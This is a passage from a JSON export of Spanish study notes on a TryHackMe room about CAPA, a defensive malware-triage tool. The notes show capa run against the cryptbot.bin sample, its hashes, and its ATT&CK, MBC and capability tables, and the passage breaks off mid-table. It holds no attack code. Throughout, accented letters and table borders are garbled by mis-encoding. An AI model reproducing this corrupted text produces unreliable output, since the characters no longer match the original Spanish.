    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 2. CAPA - The Basics",
    "content": "En esta tarea veremos c√≥mo usar CAPA. Para ejecutar la herramienta, primero abrimos Powershell, despu√©s nos tenemos que asegurar de estar en el directorio adecuado (`C:\\Users\\Administrator\\Desktop\\capa`). Luego tenemos que ejecutar `capa` o `capa.exe` y apuntar al binario. En este ejemplo usaremos **cryptbot.bin**.\n\nDespu√©s de ejecutar el comando, esperamos el resultado que puede tardar varios minutos.\n\n```powershell\nPS C:\\Users\\Administrator\\Desktop\\capa> capa.exe .\\cryptbot.bin\nloading : 100%|‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà| 485/485 [00:00<00:00, 1108.84     rules/s]\n/ analyzing program...\n```\n\nAdem√°s del comando `-h`, el cual nos da m√°s informaci√≥n sobre los par√°metros disponibles con la herramienta, dispondremos de los dos par√°metros m√°s usados, que son `-v` y `-vv`, los cuales nos dar√°n informaci√≥n detallada del resultado.\n\n| Opci√≥n                | Descriptci√≥n                         | Sintaxis de Ejemplo           |\n| --------------------- | ------------------------------------ | ----------------------------- |\n| `-h` or `--help`      | Mostrar un mensaje de ayuda y salir. | `capa -h`                     |\n| `-v` or `--verbose`   | Habilitar verbose para la salida.    | `capa.exe .\\cryptbot.bin -v`  |\n| `-vv` or `--vverbose` | Habilitar m√°s verbosidad             | `capa.exe .\\cryptbot.bin -vv` |\nEste deber√≠a ser el output del comando:\n\n```Powershell\nPS C:\\Users\\Administrator\\Desktop\\capa> capa .\\cryptbot.bin\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ md5         ‚îÇ 3b9d26d2e7433749f2c32edb13a2b0a2                                ‚îÇ\n‚îÇ sha1        ‚îÇ 969437df8f4ad08542ce8fc9831fc49a7765b7c5                        ‚îÇ\n‚îÇ sha256      ‚îÇ ae7bc6b6f6ecb206a7b957e4bb86e0d11845c5b2d9f7a00a482bef63b567ce4c‚îÇ\n‚îÇ analysis    ‚îÇ static                                                          ‚îÇ\n‚îÇ os          ‚îÇ windows                                                         ‚îÇ\n‚îÇ format      ‚îÇ pe                                                              ‚îÇ\n‚îÇ arch        ‚îÇ i386                                                            ‚îÇ\n‚îÇ path        ‚îÇ /home/strategos/Room-CAPA/cryptbot.bin                          ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ ATT&CK Tactic        ‚îÇ ATT&CK Technique                                       ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ DEFENSE EVASION      ‚îÇ Obfuscated Files or Information [T1027]                ‚îÇ\n‚îÇ                      ‚îÇ Obfuscated Files or I...Removal from Tools [T1027.005] ‚îÇ\n‚îÇ                      ‚îÇ Virtualization/Sandbox Evasion::System Checks[T1497.001‚îÇ\n‚îÇ DISCOVERY            ‚îÇ File and Directory Discovery [T1083]                   ‚îÇ\n‚îÇ EXECUTION            ‚îÇ Command and Scripting Interpreter::PowerShell [T1059.00‚îÇ\n‚îÇ                      ‚îÇ Shared Modules [T1129]                                 ‚îÇ\n‚îÇ IMPACT               ‚îÇ Resource Hijacking [T1496]                             ‚îÇ\n‚îÇ PERSISTENCE          ‚îÇ Scheduled Task/Job::At [T1053.002]                     ‚îÇ\n‚îÇ                      ‚îÇ Scheduled Task/Job::Scheduled Task [T1053.005]         ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ MAEC Category               ‚îÇ MAEC Value                                      ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ malware-category            ‚îÇ launcher                                        ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ MBC Objective            ‚îÇ MBC Behavior                                       ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ ANTI-BEHAVIORAL ANALYSIS ‚îÇ Virtual Machine Detection [B0009]                  ‚îÇ\n‚îÇ ANTI-STATIC ANALYSIS     ‚îÇ Executable Code Obfuscation::Argument Obfuscation  ‚îÇ\n‚îÇ                          ‚îÇ Executable Code Obfuscation::Stack Strings [B0032.0‚îÇ\n‚îÇ COMMUNICATION            ‚îÇ HTTP Communication [C0002]                         ‚îÇ\n‚îÇ                          ‚îÇ HTTP Communication::Read Header [C0002.014]        ‚îÇ\n‚îÇ DATA                     ‚îÇ Check String [C0019]                               ‚îÇ\n‚îÇ                          ‚îÇ Encode Data::Base64 [C0026.001]                    ‚îÇ\n‚îÇ                          ‚îÇ Encode Data::XOR [C0026.002]                       ‚îÇ\n‚îÇ DEFENSE EVASION          ‚îÇ Obfuscated Files or Information::Encoding-Standard ‚îÇ\n‚îÇ DISCOVERY                ‚îÇ File and Directory Discovery [E1083]               ‚îÇ\n‚îÇ EXECUTION                ‚îÇ Command and Scripting Interpreter [E1059]          ‚îÇ\n‚îÇ FILE SYSTEM              ‚îÇ Create Directory [C0046]                           ‚îÇ\n‚îÇ                          ‚îÇ Delete File [C0047]                                ‚îÇ\n‚îÇ                          ‚îÇ Read File [C0051]                                  ‚îÇ\n‚îÇ                          ‚îÇ Writes File [C0052]                                ‚îÇ\n‚îÇ MEMORY                   ‚îÇ Allocate Memory [C0007]                            ‚îÇ\n‚îÇ PROCESS                  ‚îÇ Create Process [C0017]                             ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ Capability                                           ‚îÇ Namespace              ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ reference anti-VM strings                            ‚îÇ anti-analysis/anti-vm/v‚îÇ\n‚îÇ reference anti-VM strings targeting VMWare           ‚îÇ anti-analysis/anti-vm/v‚îÇ\n‚îÇ reference anti-VM strings targeting VirtualBox       ‚îÇ anti-analysis/anti-vm/v‚îÇ\n‚îÇ contain obfuscated stackstrings (2 matches)          ‚îÇ anti-analysis/obfuscati‚îÇ\n‚îÇ reference HTTP User-Agent string                     ‚îÇ communication/http     ‚îÇ\n‚îÇ check HTTP status code                               ‚îÇ communication/http/clie‚îÇ\n‚îÇ reference Base64 string                              ‚îÇ data-manipulation/encod‚îÇ\n‚îÇ encode data using XOR                                ‚îÇ data-manipulation/encod‚îÇ\n‚îÇ contain a thread local storage (.tls) section        ‚îÇ executable/pe/section/t‚îÇ\n‚îÇ get common file path                                 ‚îÇ host-interaction/file-s‚îÇ\n‚îÇ create directory                                     ‚îÇ host-interaction/file-s‚îÇ\n‚îÇ delete file                                          ‚îÇ host-interaction/file-s‚îÇ\n‚îÇ read file on Windows (4 matches)                     ‚îÇ host-interaction/file-s‚îÇ\n‚îÇ write file on Windows (5 matches)                    ‚îÇ host-interaction/file-s‚îÇ\n‚îÇ get thread local storage value                       ‚îÇ host-interaction/proces‚îÇ\n‚îÇ create process on Windows                            ‚îÇ host-interaction/proces‚îÇ\n‚îÇ allocate or change RWX memory                        ‚îÇ host-interaction/proces‚îÇ\n‚îÇ reference cryptocurrency strings                     ‚îÇ impact/cryptocurrency  ‚îÇ\n‚îÇ link function at runtime on Windows (5 matches)      ‚îÇ linking/runtime-linking‚îÇ\n‚îÇ parse PE header (4 matches)                          ‚îÇ load-code/pe           ‚îÇ\n‚îÇ resolve function by parsing PE exports (186 matches) ‚îÇ load-code/pe           ‚îÇ\n‚îÇ run PowerShell expression                            ‚îÇ load-code/powershell/  ‚îÇ\n‚îÇ schedule task via at                                 ‚îÇ persistence/scheduled-t‚îÇ\n‚îÇ schedule task via schtasks                           ‚îÇ persistence/scheduled-t‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n```\n\nYa que sabemos que el tiempo de procesado es de varios minutos, hemos pre-procesado esto en un archivo llamado cryptbot.txt, localizado en `C:\\Users\\Administrator\\Desktop\\capa`. En otra Powershell escribe `Get-Content cryptbot.txt`:\n\n```powershell\nPS C:\\Users\\Administrator\\Desktop\\capa> Get-Content .\\cryptbot.txt\n```\n\nAl hacer esto obtendr√°s el mismo output que si realizaras el escaneo.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Dissecting CAPA Results Part 1 - General Information, MITRE and MAEC",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/2-capa-the-basics/3-dissecting-capa-results-part-1-general-information-mitre-and-maec/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/2. CAPA - The Basics/3. Dissecting CAPA Results Part 1 - General Information, MITRE and MAEC.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 2. CAPA - The Basics",
    "content": "Como hemos mencionado en la tarea anterior, los resultados de ejecutar CAPA contra cryptbot.bin ser√°n discutidos. Vamos a diseccionar los resultados por bloque y t√≥pico.\n\nEl primer bloque contiene informaci√≥n de dominio b√°sica sobre el archivo. Esto incluye lo siguiente:\n\n- Los algoritmos criptogr√°ficos, como `md5` y `sha1/256`.\n- El campo `analysis` nos dice c√≥mo realiz√≥ CAPA el an√°lisis del archivo.\n- El campo `os` revela el sistema operativo para el que aplican las capacidades detectadas.\n- El campo `arch` nos permite determinar si estamos lidiando con un binario relacionado a arquitectura x86.\n- El campo `path` donde estaba localizado el archivo analizado.\n\n```powershell\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ md5         ‚îÇ 3b9d26d2e7433749f2c32edb13a2b0a2                                ‚îÇ\n‚îÇ sha1        ‚îÇ 969437df8f4ad08542ce8fc9831fc49a7765b7c5                        ‚îÇ\n‚îÇ sha256      ‚îÇ ae7bc6b6f6ecb206a7b957e4bb86e0d11845c5b2d9f7a00a482bef63b567ce4c‚îÇ\n‚îÇ analysis    ‚îÇ static                                                          ‚îÇ\n‚îÇ os          ‚îÇ windows                                                         ‚îÇ\n‚îÇ format      ‚îÇ pe                                                              ‚îÇ\n‚îÇ arch        ‚îÇ i386                                                            ‚îÇ\n‚îÇ path        ‚îÇ /home/strategos/Room-CAPA/cryptbot.bin                          ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n```\n\n-------------------------------\n<h2>MITRE ATT&CK</h2>\nEl framework MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) es un repositorio de conocimiento global que meticulosamente documenta las t√°cticas y t√©cnicas empleadas por los actores de amenazas en cada fase de un ciberataque. Funciona como un playbook estrat√©gico, ofreciendo vistas detalladas en los m√©todos de los atacantes, desde ganar acceso inicial hasta mantener presencia (persistencia), escalar privilegios, evadir defensas, mover lateralmente en la red y un largo etc√©tera.\n\nCAPA usa este formato para su output. Algunos resultados pueden no contener el identificador de t√©cnica o subt√©cnica.\n\n| Formato                                                                                                                    | Ejemplo                                                                                  | Explicaci√≥n                                                                                                                                                                                                                                |\n| -------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |\n| **ATT&CK Tactic**::**ATT&CK Technique**::**Technique Identifier**                                                          | Defense Evasion::Obfuscated Files or Information::T1027                                  | **DEFENSE EVASION =**¬†ATT&CK Tactic  <br>**Obfuscated Files or Information =**¬†ATT&CK Technique  <br>**T1027 =**¬†Technique Identifier                                                                                                      |\n| **ATT&CK Tactic**::**ATT&CK Technique**::**ATT&CK Sub-Technique**::**Technique Identifier**[.]Sub-technique¬†**Identifier** | Defense Evasion::Obfuscated Files or Information::Indicator Removal from Tools T1027.005 | **DEFENSE EVASION** = ATT&CK Tactic  <br>**Obfuscated Files or Information** = ATT&CK Technique  <br>**Indicator Removal from Tools** = ATT&CK Sub-Technique  <br>**T1027 =**¬†Technique Identifier  <br>**005** = Sub-Technique Identifier |\n\n```powershell\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ ATT&CK Tactic        ‚îÇ ATT&CK Technique                                       ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ DEFENSE EVASION      ‚îÇ Obfuscated Files or Information [T1027]                ‚îÇ\n‚îÇ                      ‚îÇ Obfuscated Files or Information::Indicator Removal from Tools [T1027.005]‚îÇ\n‚îÇ                      ‚îÇ Virtualization/Sandbox Evasion::System Checks [T1497.001]‚îÇ\n‚îÇ DISCOVERY            ‚îÇ File and Directory Discovery [T1083]                   ‚îÇ\n‚îÇ EXECUTION            ‚îÇ Command and Scripting Interpreter::PowerShell [T1059.001]‚îÇ\n‚îÇ                      ‚îÇ Shared Modules [T1129]                                 ‚îÇ\n‚îÇ IMPACT               ‚îÇ Resource Hijacking [T1496]                             ‚îÇ\n‚îÇ PERSISTENCE          ‚îÇ Scheduled Task/Job::At [T1053.002]                     ‚îÇ\n‚îÇ                      ‚îÇ Scheduled Task/Job::Scheduled Task [T1053.005]         